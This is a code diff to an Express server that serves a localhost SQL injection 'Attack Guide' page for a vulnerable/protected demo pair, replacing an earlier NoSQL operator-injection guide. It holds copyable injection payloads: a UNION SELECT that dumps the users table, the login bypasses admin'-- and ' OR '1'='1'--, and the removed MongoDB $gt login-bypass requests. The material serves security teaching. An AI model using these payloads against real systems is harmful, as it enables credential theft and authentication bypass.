@@ -1,28 +1,36 @@
 /*
- * Terminal 2: cd demo-attacked/nosql-injection && npm run guide
+ * Terminal 2: cd demo-attacked/sql-injection && npm run guide
  */
 
 const express = require('express');
 
 const app = express();
-const PORT = 3023;
-const VICTIM_PORT = 3022;
-const PROTECTED_PORT = 3024;
+const PORT = 3026;
+const VICTIM_PORT = 3025;
+const PROTECTED_PORT = 3027;
 
-const CURL_PAYLOAD = [
-  'curl -s -X POST http://localhost:' + VICTIM_PORT + '/login \\',
-  "  -H 'Content-Type: application/json' \\",
-  "  -d '{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}' \\",
-  '  -L',
-].join('\n');
-
-const FETCH_PAYLOAD = [
-  "fetch('http://localhost:" + VICTIM_PORT + "/login', {",
-  "  method: 'POST',",
-  "  headers: { 'Content-Type': 'application/json' },",
-  "  body: JSON.stringify({ username: 'admin', password: { $gt: '' } })",
-  "}).then(r => console.log('Redirected to:', r.url))",
-].join('\n');
+const PAYLOADS = [
+  {
+    target: 'Dump users table',
+    where: 'Search field',
+    payload: "' UNION SELECT id,username,password,email,'' FROM users--",
+  },
+  {
+    target: 'Login bypass',
+    where: 'Admin username field',
+    payload: "admin'--",
+  },
+  {
+    target: 'True condition bypass',
+    where: 'Admin username field',
+    payload: "' OR '1'='1'--",
+  },
+  {
+    target: 'Error-based discovery',
+    where: 'Search field',
+    payload: "'",
+  },
+];
 
 function escapeHtml(str) {
   return String(str)
@@ -32,13 +40,26 @@ function escapeHtml(str) {
     .replace(/"/g, '&quot;');
 }
 
+function buildPayloadRows() {
+  return PAYLOADS.map(function (row, index) {
+    return (
+      '<tr>' +
+        '<td>' + escapeHtml(row.target) + '</td>' +
+        '<td>' + escapeHtml(row.where) + '</td>' +
+        '<td><code id="payload-' + index + '">' + escapeHtml(row.payload) + '</code></td>' +
+        '<td><button type="button" class="demo-btn btn-copy" data-target="payload-' + index + '">Copy</button></td>' +
+      '</tr>'
+    );
+  }).join('');
+}
+
 function buildGuideHtml() {
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>NoSQL Injection — Attack Guide</title>
+  <title>SQL Injection — Attack Guide</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
@@ -70,7 +91,7 @@ function buildGuideHtml() {
       border: 1px solid #1a3a1a;
       border-radius: 8px;
       padding: 1.5rem;
-      max-width: 900px;
+      max-width: 50vw;
     }
     .credentials-panel h2 {
       font-size: 0.95rem;
@@ -111,7 +132,7 @@ function buildGuideHtml() {
       border: 1px solid #1a3a1a;
       border-radius: 8px;
       padding: 1.5rem;
-      max-width: 900px;
+      max-width: 50vw;
       margin-top: 2rem;
     }
     .referer-panel h2 {
@@ -186,83 +207,74 @@ function buildGuideHtml() {
   </style>
 </head>
 <body>
-  <h1>NoSQL Injection — Attack Guide</h1>
-  <p class="subtitle">How operator injection bypasses MongoDB authentication</p>
+  <h1>SQL Injection — Attack Guide</h1>
+  <p class="subtitle">How string concatenation turns user input into executable SQL</p>
 
-  <div class="flow-box" style="max-width:900px">
-    <strong>HOW MONGODB LOGIN QUERIES WORK</strong><br><br>
-    <pre>// Normal login — what the developer intended
-db.users.findOne({ username: "alice", password: "hunter2" })
-// → returns user object only if both fields match exactly</pre>
+  <div class="flow-box" style="max-width:50vw">
+    <strong>THE VULNERABLE PATTERN</strong><br><br>
+    <pre>-- Developer intended:
+SELECT * FROM resources WHERE title LIKE '%javascript%'
+
+-- What happens when attacker inputs:  ' UNION SELECT id,username,password,email FROM users--
+SELECT * FROM resources
+WHERE title LIKE '%' UNION SELECT id,username,password,email FROM users--%'
+-- The -- comments out the rest of the original query
+-- UNION appends results from the users table to the resources results
+-- attacker now sees usernames and passwords in the search results</pre>
   </div>
 
-  <div class="flow-box" style="max-width:900px">
-    <strong>THE INJECTION</strong><br><br>
-    <pre>// What the attacker sends (HTTP request body):
-{ "username": "admin", "password": { "$gt": "" } }
+  <div class="flow-box" style="max-width:50vw">
+    <strong>LOGIN BYPASS</strong><br><br>
+    <pre>-- Developer intended:
+SELECT * FROM users WHERE username = 'admin' AND password = 'wrongpassword'
+-- → returns nothing — wrong password
 
-// What Express parses and the server builds:
-db.users.findOne({ username: "admin", password: { $gt: "" } })
-// → "$gt": "" means "password greater than empty string"
-// → any non-empty password satisfies this — admin is returned
-// → attacker is logged in without knowing the password</pre>
+-- Attacker sends username: admin'--   password: anything
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
+-- Everything after -- is a comment
+-- Password check never runs
+-- → returns the admin row — login succeeds</pre>
   </div>
 
   <div class="credentials-panel">
-    <h2>Other Operators That Work</h2>
+    <h2>Attack Payloads to Try</h2>
     <table>
       <thead>
         <tr>
+          <th>Target</th>
+          <th>Where</th>
           <th>Payload</th>
-          <th>Effect</th>
+          <th></th>
         </tr>
       </thead>
-      <tbody>
-        <tr>
-          <td><code>{ "$gt": "" }</code></td>
-          <td>Greater than empty string — matches any non-empty password</td>
-        </tr>
-        <tr>
-          <td><code>{ "$ne": "x" }</code></td>
-          <td>Not equal to "x" — matches any password except "x"</td>
-        </tr>
-        <tr>
-          <td><code>{ "$regex": ".*" }</code></td>
-          <td>Regex match-all — matches anything</td>
-        </tr>
-        <tr>
-          <td><code>{ "$exists": true }</code></td>
-          <td>Field exists — matches any user with a password field</td>
-        </tr>
-      </tbody>
+      <tbody>${buildPayloadRows()}</tbody>
     </table>
+    <p style="font-size:0.85rem;color:#94a3b8;line-height:1.7;max-width:640px;margin-top:0.75rem">
+      Note: the original search query selects 5 columns. Add a 5th column
+      (<code>''</code> or <code>role</code>) to the UNION payload so column counts match.
+    </p>
   </div>
 
   <div class="credentials-panel" style="margin-top:2rem">
-    <h2>Copy Payloads</h2>
-    <div style="margin-bottom:1.25rem">
-      <div style="font-size:0.72rem;color:#64748b;margin-bottom:0.4rem">curl (login bypass)</div>
-      <pre id="curl-payload">${escapeHtml(CURL_PAYLOAD)}</pre>
-      <button type="button" class="demo-btn btn-copy" data-target="curl-payload">Copy</button>
-    </div>
-    <div>
-      <div style="font-size:0.72rem;color:#64748b;margin-bottom:0.4rem">browser console fetch</div>
-      <pre id="fetch-payload">${escapeHtml(FETCH_PAYLOAD)}</pre>
-      <button type="button" class="demo-btn btn-copy" data-target="fetch-payload">Copy</button>
-    </div>
+    <h2>SQL vs NoSQL Injection</h2>
+    <pre>SQL injection works on any string input — form-encoded or JSON.
+The attacker injects SQL keywords and syntax directly into the query string.
+
+NoSQL operator injection (see port 3023) only works on JSON endpoints.
+The attacker injects a MongoDB operator object instead of a string value.
+
+Both are caused by the same root issue: user input treated as query logic
+rather than query data.</pre>
   </div>
 
   <div class="credentials-panel" style="margin-top:2rem">
-    <h2>Why JSON Endpoints Are Specifically Vulnerable</h2>
+    <h2>Why the UNION Attack Works</h2>
     <p style="font-size:0.85rem;color:#94a3b8;line-height:1.7;max-width:640px">
-      This attack only works because the endpoint accepts JSON
-      (Content-Type: application/json) and express.json() parses nested objects.
-      A form-encoded endpoint (application/x-www-form-urlencoded) cannot send a
-      nested object — password[$gt]= arrives as the literal string "$gt=".
-      JSON is required for object injection.<br><br>
-      SQL injection does not have this limitation — it works on any string input.
-      That is why SQL and NoSQL injection have different but equally dangerous
-      attack surfaces.
+      UNION combines SELECT results — both queries must have the same number of columns.
+      The original query selects 5 columns (id, title, url, tags, author).
+      The injected query must also select exactly 5 columns.
+      If column counts don't match, SQLite throws an error — the attacker adjusts.
+      UNION SELECT is how attackers enumerate and dump arbitrary tables.
     </p>
   </div>
 
@@ -283,10 +295,10 @@ db.users.findOne({ username: "admin", password: { $gt: "" } })
       });
     });
     document.getElementById('btn-switcher-vulnerable').addEventListener('click', function () {
-      window.open('http://localhost:${VICTIM_PORT}/login', '_blank');
+      window.open('http://localhost:${VICTIM_PORT}', '_blank');
     });
     document.getElementById('btn-switcher-protected').addEventListener('click', function () {
-      window.open('http://localhost:${PROTECTED_PORT}/login', '_blank');
+      window.open('http://localhost:${PROTECTED_PORT}', '_blank');
     });
   </script>
 </body>
@@ -298,5 +310,5 @@ app.get('/', function (req, res) {
 });
 
 app.listen(PORT, function () {
-  console.log('NoSQL attack guide running at http://localhost:' + PORT);
+  console.log('SQL attack guide running at http://localhost:' + PORT);
 });
